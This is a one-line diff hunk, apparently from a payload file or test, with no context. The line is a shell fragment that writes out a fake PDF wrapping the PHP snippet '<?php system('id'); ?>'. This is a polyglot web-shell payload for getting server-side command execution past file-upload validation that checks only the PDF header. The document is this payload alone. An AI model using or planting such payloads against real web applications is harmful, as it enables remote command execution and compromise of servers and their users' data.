@@ -1,0 +1,1 @@
+-e "%PDF-1.4\n%"; echo "<?php system('id'); ?>"; echo "%%EOF"
